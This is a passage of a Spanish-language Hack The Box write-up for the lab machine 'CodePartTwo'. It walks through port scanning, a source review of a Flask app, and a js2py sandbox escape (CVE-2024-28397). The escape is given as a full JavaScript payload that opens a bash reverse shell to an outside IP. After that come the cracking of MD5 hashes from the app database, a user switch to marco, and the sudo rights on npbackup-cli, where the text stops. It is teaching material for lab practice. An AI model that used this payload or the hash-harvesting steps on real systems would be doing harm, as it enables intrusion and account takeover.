---
title: "HTB CodePartTwo"
date: 2025-12-19 00:35:00 +0000
categories: [WriteUps, Hack The Box, Linux, Easy]
tags: [SourceCodeReview, WhiteboxPentest, Js2Py, CVE-2024-28397, RemoteCodeExecution, SandboxEscape, DatabaseEnum, Crackstation, sudoers, npbackup-cli, NPBackup, MaliciousConf]
image: /assets/img/writeups/htb-codeparttwo/HTB_CodePartTwo.png
---

`CodePartTwo` es una máquina Linux de dificultad fácil que presenta una aplicación web Flask personalizada para ejecutar código JavaScript. La explotación comienza con un análisis de código fuente (**Whitebox Pentest**), identificando que la aplicación utiliza la biblioteca vulnerable **js2py** (versión 0.74). Aprovechando la vulnerabilidad **CVE-2024-28397**, un escape de sandbox en **js2py**, se ejecuta un payload malicioso que establece una reverse shell, obteniendo acceso inicial como el usuario `app`. Dentro del sistema, se enumera una base de datos SQLite local que contiene hashes MD5 de las contraseñas de los usuarios. Utilizando CrackStation, se descifra la contraseña del usuario `marco`, permitiendo una escalada lateral de privilegios. Para la escalada final a root, se identifica que el usuario `marco` puede ejecutar el comando `/usr/local/bin/npbackup-cli` con privilegios de root mediante sudo. Se explota de dos formas: primero, abusando de la opción `pre_exec_commands` en un archivo de configuración malicioso; y segundo, eludiendo la restricción del wrapper de Python para la opción `--external-backend-binary`. Ambos métodos consiguen establecer el bit SUID en `/bin/bash`, lo que permite obtener una shell con privilegios de root y acceso completo al sistema.

**Tags:**
[#SourceCodeReview](/tags/sourcecodereview/) [#WhiteboxPentest](/tags/whiteboxpentest/) [#Js2Py](/tags/js2py/) [#CVE-2024-28397](/tags/cve-2024-28397/) [#SandboxEscape](/tags/sandboxescape/) [#RemoteCodeExecution](/tags/remotecodeexecution/) [#DatabaseEnum](/tags/databaseenum/) [#Crackstation](/tags/crackstation/) [#Sudoers](/tags/sudoers/) [#npbackup-cli](/tags/npbackup-cli/) [#MaliciousConf](/tags/maliciousconf/)

----
## Reconnaissance

A través de la herramienta de `rustscan` realizaremos un escaneo de la dirección IP establecida en la variable `IP`. El escaneo se realizará en todos los puertos existentes y se realizará además un escaneo de versiones y de scripts básicos de reconocimiento que nos proporciona `Nmap` por defecto.

En el resultado obtenido verificamos que se encuentra expuesto el puerto 22 (`SSH`) y 8000 que parece ser un servicio (`HTTP`) con una página web en un servidor Gunicorn (Green Unicorn).

```sh
❯ export IP=10.10.11.82

❯ rustscan -a $IP --ulimit 1000 -r 1-65535 -- -A -sC -sV -o nmapresult.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 1000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.82:22
Open 10.10.11.82:8000
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A -sC -sV -o nmapresult.txt" on ip 10.10.11.82
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2025-12-18 06:45 CET
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:45
Completed NSE at 06:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:45
Completed NSE at 06:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:45
Completed NSE at 06:45, 0.00s elapsed
Initiating Ping Scan at 06:45
Scanning 10.10.11.82 [4 ports]
Completed Ping Scan at 06:45, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:45
Completed Parallel DNS resolution of 1 host. at 06:45, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 06:45
Scanning 10.10.11.82 [2 ports]
Discovered open port 22/tcp on 10.10.11.82
Discovered open port 8000/tcp on 10.10.11.82
Completed SYN Stealth Scan at 06:45, 0.08s elapsed (2 total ports)
Initiating Service scan at 06:45
Scanning 2 services on 10.10.11.82
Completed Service scan at 06:45, 6.45s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.82
Retrying OS detection (try #2) against 10.10.11.82
Initiating Traceroute at 06:45
Completed Traceroute at 06:45, 0.09s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 06:45
Completed Parallel DNS resolution of 2 hosts. at 06:45, 0.01s elapsed
DNS resolution of 2 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.11.82.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:45
Completed NSE at 06:45, 2.03s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:45
Completed NSE at 06:45, 0.45s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:45
Completed NSE at 06:45, 0.00s elapsed
Nmap scan report for 10.10.11.82
Host is up, received echo-reply ttl 63 (0.060s latency).
Scanned at 2025-12-18 06:45:23 CET for 14s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a047b40c6967933af9b45db32fbc9e23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d443ff1b1e2bb3d91d5da580f51e5ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f16b1d3618067a053f0757e1ef86b485 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: gunicorn/20.0.4
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 5.0 (94%), Linux 5.4 (94%), Linux 5.0 - 5.4 (94%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=12/18%OT=22%CT=%CU=34478%PV=Y%DS=2%DC=T%G=N%TM=69439501%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11NW7%O6=M542ST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 25.182 days (since Sun Nov 23 02:23:13 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   86.08 ms 10.10.16.1
2   22.99 ms 10.10.11.82

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:45
Completed NSE at 06:45, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:45
Completed NSE at 06:45, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:45
Completed NSE at 06:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds
           Raw packets sent: 66 (4.596KB) | Rcvd: 42 (3.136KB)
```

---
## Web Enumeration

A través de la herramienta `cURL` comprobaremos las cabeceras de la página web, en este caso, no nos proporciona ningún tipo de información adicional, solamente que la página web se encuentra alojada en un servidor `Gunicorn` con la versión `20.0.4`.

Por otro lado, comprobaremos las tecnologías presentes en la página web y información útil a través de `whatweb`. En el resultado obtenido, verificamos la misma información obtenida en los resultados anteriores. Iremos a investigar manualmente la página web expuesta.

```sh
❯ curl -I $IP:8000
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Thu, 18 Dec 2025 05:51:28 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 2212

❯ whatweb -a 3 $IP:8000
http://10.10.11.82:8000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn/20.0.4], IP[10.10.11.82], Script, Title[Welcome to CodePartTwo]
```

Al acceder a [http://10.10.11.82:8000](http://10.10.11.82:8000), nos encontramos con la página web titulada `"Welcome To CodePartTwo"`. La plataforma se presenta como una herramienta de código abierto diseñada para que desarrolladores puedan escribir, guardar y **ejecutar código JavaScript** de manera rápida y colaborativa. En la página principal se observan botones de `Login`, `Register` y `Download App`, los cuales procederemos a investigar a continuación.


![image](/assets/img/writeups/htb-codeparttwo/CodePartTwo_1.png)

---
### Reviewing source code

La opción de `Download App` llama inmediatamente nuestra atención, ya que al tratarse de una aplicación declarada como **Open Source**, nos proporciona acceso directo al código fuente completo. Esto nos permite realizar un **Whitebox Pentest**, analizando exhaustivamente el código en busca de posibles vulnerabilidades que hayan podido pasar desapercibidas para los desarrolladores de CodePartTwo.

Al hacer clic en el botón, confirmamos que se inicia la descarga de un **archivo ZIP de 10.5 KB**, el cual procederemos a analizar en detalle a continuación.

![image](/assets/img/writeups/htb-codeparttwo/CodePartTwo_2.png)

Con el archivo ZIP descargado en nuestro máquina, procedemos a descomprimirlo utilizando el comando `unzip`. Al realizarlo, obtenemos un directorio llamado `app/` que contiene la estructura completa de la aplicación web de `CodePartTwo`. Podemos ver archivos Python como `app.py` que parece ser el principal, plantillas HTML, recursos estáticos (CSS y JavaScript), y una base de datos SQLite llamada `users.db` dentro de la carpeta `instance/`.

```sh
❯ unzip app.zip
Archive:  app.zip
   creating: app/
   creating: app/static/
   creating: app/static/css/
  inflating: app/static/css/styles.css
   creating: app/static/js/
  inflating: app/static/js/script.js
  inflating: app/app.py
   creating: app/templates/
  inflating: app/templates/dashboard.html
  inflating: app/templates/reviews.html
  inflating: app/templates/index.html
  inflating: app/templates/base.html
  inflating: app/templates/register.html
  inflating: app/templates/login.html
  inflating: app/requirements.txt
   creating: app/instance/
  inflating: app/instance/users.db
```

A continuación, accedemos al directorio `app/` y utilizamos el comando `tree` para visualizar de manera más clara la jerarquía de archivos y carpetas del proyecto.

Una vez identificada la base de datos SQLite (`instance/users.db`), decidimos inspeccionar su contenido. Esto nos permite obtener un esquema preliminar de las tablas que contiene. En la salida, identificamos dos tablas principales: `user` y `code_snippet`, pero ningún dato relevante sobre ella.

```sh
❯ cd app
❯ tree
.
├── app.py
├── instance
│   └── users.db
├── requirements.txt
├── static
│   ├── css
│   │   └── styles.css
│   └── js
│       └── script.js
└── templates
    ├── base.html
    ├── dashboard.html
    ├── index.html
    ├── login.html
    ├── register.html
    └── reviews.html

6 directories, 11 files

❯ strings instance/users.db
SQLite format 3
Wtablecode_snippetcode_snippet
CREATE TABLE code_snippet (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        code TEXT NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id)
Ctableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(80) NOT NULL,
        password_hash VARCHAR(128) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
indexsqlite_autoindex_user_1user
```

Revisando el archivo `app.py`, el punto más crítico de la aplicación Flask es la ruta `/run_code`. Esta función toma **código JavaScript** enviado por el usuario y lo ejecuta directamente con `js2py.eval_js()`, lo que podría permitir un `Remote Code Execution` (RCE).

Por otro lado, podemos comprobar que las contraseñas se almacenan usando el hash MD5 (en las rutas `/register` y `/login`). Otro detalle a destacar es que la clave secreta de la aplicación (`app.secret_key`) se encuentra en texto plano dentro del código fuente.

```sh
❯ cat app.py
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```

Al revisar a fondo los archivos extraídos del .zip, se identifica el archivo `requirements.txt`. Este archivo especifica las dependencias de la aplicación Flask y, de manera crítica, confirma que se utiliza `js2py` en su versión `0.74`.

>`Js2Py` es una biblioteca de Python diseñada para traducir código JavaScript (ECMA Script 5.1) directamente a código Python. A diferencia de otras herramientas que requieren un motor externo como Node.js, Js2Py funciona como un intérprete escrito completamente en Python, lo que permite ejecutar JavaScript de forma nativa sin dependencias adicionales. 
{: .prompt-info }

Sería un punto interesante de revisar si esta versión de `js2py` tiene una vulnerabilidad ya reportada como CVE.

```sh
❯ cat requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

Al realizar una búsqueda por Internet a través de los siguientes términos `"js2py 0.74 cve"`, nos encontramos con varios recursos que apuntan a una vulnerabilidad reportada como `CVE-2024-28397`.

>`js2py` tiene una vulnerabilidad de escape de sandbox asignada como `CVE-2024-28397`, que es utilizada por el punto final de la API `/flash/addcrypted2` de `pyload-ng`. Aunque este punto final está diseñado para aceptar solo conexiones localhost, podemos eludir esta restricción utilizando el encabezado HTTP, accediendo así a esta API y logrando RCE.
{: .prompt-danger }

![image](/assets/img/writeups/htb-codeparttwo/CodePartTwo_7.png)

Realizando una búsqueda de esa vulnerabilidad para intentar localizar un PoC (**Proof of Concept**), nos encontramos con diferentes repositorios de GitHub que nos muestran el payload que podríamos intentar utilizar para explotar la vulnerabilidad.

Con este PoC en mano, el siguiente paso será adaptar y probar el payload en la aplicación `CodePartTwo`.

- [https://github.com/pyload/pyload/security/advisories/GHSA-r9pp-r4xf-597r](https://github.com/pyload/pyload/security/advisories/GHSA-r9pp-r4xf-597r)

- [https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape)

![image](/assets/img/writeups/htb-codeparttwo/CodePartTwo_10.png)

----
## Initial Foothold
### js2py Sandbox Escape - Remote Code Execution (RCE) [CVE-2024-28397]

Volveremos a la aplicación web [CodePartTwo](http://10.10.11.82:8000) e ingresaremos al apartado de `Register` para poder registrar nuestro usuario y así poder probar la aplicación web.

![image](/assets/img/writeups/htb-codeparttwo/CodePartTwo_3.png)

Una vez registrado, seremos redirigidos automáticamente al apartado de `Login`, donde introduciremos las credenciales del usuario registrado en el punto anterior.

![image](/assets/img/writeups/htb-codeparttwo/CodePartTwo_4.png)

Al acceder con nuestras credenciales, nos encontraremos en un Dashboard que incluye un **Code Editor**. Este editor permite a los desarrolladores que prueban la aplicación escribir, guardar y ejecutar código JavaScript.

Para verificar cómo funciona la aplicación web, pondremos el siguiente código simple de JavaScript (el que proporciona el ejemplo). Al introducir el código JS y pulsar la opción **Run Code**, verificamos que en el apartado de **Output** aparece la salida del código JavaScript establecido.

```js
var x = 16;
x;
```

![image](/assets/img/writeups/htb-codeparttwo/CodePartTwo_6.png)

Nuestro interés principal es verificar si la vulnerabilidad reportada en `CVE-2024-28397` se puede reproducir en la aplicación web `CodePartTwo`. Ya hemos verificado a través del código fuente que la aplicación utiliza por detrás `js2py` en una versión vulnerable y ejecuta lo que el usuario introduce en el **Code Editor**.

En nuestros intentos iniciales con distintos payloads, tratamos de comprobar si en el campo **Output** aparecía el resultado del comando arbitrario que queríamos ejecutar, pero no obtuvimos un resultado positivo.

Por ello, cambiaremos la estrategia e intentaremos enviarnos directamente una Reverse Shell para conseguir un acceso inicial en el servidor. Nos pondremos en escucha con la herramienta `pwncat-cs` para recibir la reverse shell.

> `pwncat-cs` es un framework post-explotación avanzado que funciona como una solución de Command and Control (C2) ligera para entornos locales. A diferencia de una shell convencional, actúa como un centro de control que permite gestionar múltiples sesiones simultáneas, automatizar tareas de enumeración y mantener persistencia en los sistemas comprometidos.
{: .prompt-info }

```sh
❯ pwncat-cs -lp 4444
[07:05:55] Welcome to pwncat 🐈!                                       __main__.py:164
bound to 0.0.0.0:4444 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

Utilizaremos el siguiente payload, que podemos encontrar en los [repositorios de GitHub](https://github.com/pyload/pyload/security/advisories/GHSA-r9pp-r4xf-597r) indicados anteriormente. El campo que nos interesa modificar es la variable `cmd`, ya que es el que ejecutará nuestra reverse shell.

```js
let cmd = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.17.137/4444 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
function f() {
    return n11
}
```

Insertaremos nuestro payload en el **Code Editor** de la aplicación web - `CodePartTwo` y le daremos a la opción de `Run Code`. Esto ejecutará nuestro código arbitrario y nos permitirá intentar explotar la vulnerabilidad `js2py Sandbox Escape - Remote Code Execution (CVE-2024-28397)`. Observamos que la aplicación web se queda colgada, lo cual es un buen indicio de que probablemente se ha establecido la conexión.

![image](/assets/img/writeups/htb-codeparttwo/CodePartTwo_8.png)

Al revisar nuestro listener de `pwncat-cs`, confirmamos que hemos recibido una conexión desde la dirección IP `10.10.11.82`. Ahora nos encontramos dentro del servidor remoto bajo el contexto del usuario `app`.

```sh
❯ pwncat-cs -lp 4444
[07:06:19] Welcome to pwncat 🐈!                                                                                                                                                                                          __main__.py:164
[07:06:41] received connection from 10.10.11.82:58194                                                                                                                                                                          bind.py:84
[07:06:43] 10.10.11.82:58194: registered new host w/ db                                                                                                                                                                    manager.py:957
(local) pwncat$
(remote) app@codeparttwo:/home/app/app$
```

---
## Shell as marco
### Database Enumeration

Nos encontramos en el directorio `/home/app/app`, que contiene el código fuente de la aplicación web. Recordando el análisis anterior, dentro de `app/instance` se encontraba una base de datos.

Revisamos esta base de datos para buscar información adicional que pueda servir para un movimiento lateral. El código fuente del comprimido solo indicaba la existencia de dos tablas sin datos concretos.

Al revisar la base de datos ubicada en `instance/users.db`, encontramos los hashes MD5 para los usuarios `app` y `marco`. Sabemos que son hashes MD5 porque el código fuente utilizaba `hashlib.md5` y además tienen una longitud de 32 caracteres.

```sh
(remote) app@codeparttwo:/home/app/app$ strings instance/users.db
SQLite format 3
Wtablecode_snippetcode_snippet
CREATE TABLE code_snippet (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        code TEXT NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id)
Ctableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(80) NOT NULL,
        password_hash VARCHAR(128) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
indexsqlite_autoindex_user_1user
Mappa97588c0e2fa3a024876339e27aeb42e)
Mmarco649c9d65a206a75f5abe509fe128bce5
        marco
var x = 16;
```

Al revisar los usuarios del sistema que disponen de una `/bin/bash`, confirmamos la existencia de los usuarios `marco` y `app` (este último ya bajo nuestro control).

```sh
(remote) app@codeparttwo:/home/app/app$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
marco:x:1000:1000:marco:/home/marco:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

---

### Cracking MD5 Hash via CrackStation

Para poder crackear los hashes obtenidos del punto anterior, visitaremos la siguiente página web [https://crackstation.net/](https://crackstation.net/).

Al intentar crackear los hashes, verificamos que solamente que hemos logrado crackear el hash correspondiente para el usuario `marco`.

![image](/assets/img/writeups/htb-codeparttwo/CodePartTwo_9.png)

Desde nuestra sesión en `pwncat-cs`, tratamos de cambiar de usuario mediante el comando `su`, ingresando las credenciales correspondientes al usuario `marco`.

Finalmente, comprobamos que obtenemos acceso bajo el contexto de dicho usuario y podemos leer la flag `user.txt`.

```sh
(remote) app@codeparttwo:/home/app/app$ su marco
Password:
marco@codeparttwo:/home/app/app$ cat /home/marco/user.txt
3a6d63********************c39062
```

---
## Privilege Escalation
### Abusing sudoers privilege (npbackup-cli)

A continuación, nuestro siguiente objetivo es elevar nuestros privilegios para finalmente obtener acceso como `root`.

Para ello, realizaremos una revisión de los permisos que tiene el usuario `marco` en el sistema. Con el comando `id`, podemos visualizar a qué grupos pertenece el usuario. En el resultado, verificamos que hay un grupo llamado `backups` que nos llama bastante la atención.

Realizando una búsqueda de archivos con el comando find para localizar archivos o binarios a los que el grupo `backups` tenga acceso, encontramos que tiene permisos sobre un directorio llamado `/opt/npbackup-cli`.

```sh
marco@codeparttwo:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)

marco@codeparttwo:~$ find / -group backups 2>/dev/null
/opt
/opt/npbackup-cli
```

Por otro lado, al revisar si el usuario `marco` dispone de algún permiso de **sudoers** (que permita ejecutar un binario, script o instrucción como sudo sin necesidad de la contraseña de `root`), encontramos que puede ejecutar el binario `npbackup-cli`.

>`npbackup-cli` es la interfaz de línea de comandos (CLI) de la herramienta de respaldo multiplataforma `NPBackup`, diseñada para administradores de sistemas que necesitan realizar copias de seguridad de servidores y portátiles de forma segura y eficiente, permitiendo configuraciones, respaldos y restauraciones mediante comandos, funcionando sobre restic para deduplicación, compresión y encriptación, con soporte para múltiples repositorios
{: .prompt-info }

```sh
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

Revisando la ayuda del binario, las opciones que destacan son `-c CONFIG_FILE` (para usar un archivo de configuración alternativo), `-b` (para ejecutar un backup) y `-f` (para forzar la operación).

```sh
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli --help
usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP] [-b] [-f] [-r RESTORE] [-s] [--ls [LS]] [--find FIND] [--forget FORGET] [--policy] [--housekeeping] [--quick-check] [--full-check]
                    [--check CHECK] [--prune [PRUNE]] [--prune-max] [--unlock] [--repair-index] [--repair-packs REPAIR_PACKS] [--repair-snapshots] [--repair REPAIR] [--recover] [--list LIST] [--dump DUMP] [--stats [STATS]]
                    [--raw RAW] [--init] [--has-recent-snapshot] [--restore-includes RESTORE_INCLUDES] [--snapshot-id SNAPSHOT_ID] [--json] [--stdin] [--stdin-filename STDIN_FILENAME] [-v] [-V] [--dry-run] [--no-cache] [--license]
                    [--auto-upgrade] [--log-file LOG_FILE] [--show-config] [--external-backend-binary EXTERNAL_BACKEND_BINARY] [--group-operation GROUP_OPERATION] [--create-key CREATE_KEY]
                    [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK] [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK] [--check-config-file]

Portable Network Backup Client This program is distributed under the GNU General Public License and comes with ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under certain conditions; Please
type --license for more info.

optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current dir/npbackup.conf)
  --repo-name REPO_NAME
                        Name of the repository to work with. Defaults to 'default'. This can also be a comma separated list of repo names. Can accept special name '__all__' to work with all repositories.
  --repo-group REPO_GROUP
                        Comme separated list of groups to work with. Can accept special name '__all__' to work with all repositories.
  -b, --backup          Run a backup
  -f, --force           Force running a backup regardless of existing backups age
  -r RESTORE, --restore RESTORE
                        Restore to path given by --restore, add --snapshot-id to specify a snapshot other than latest
  -s, --snapshots       Show current snapshots
  --ls [LS]             Show content given snapshot. When no snapshot id is given, latest is used
  --find FIND           Find full path of given file / directory
  --forget FORGET       Forget given snapshot (accepts comma separated list of snapshots)
  --policy              Apply retention policy to snapshots (forget snapshots)
  --housekeeping        Run --check quick, --policy and --prune in one go
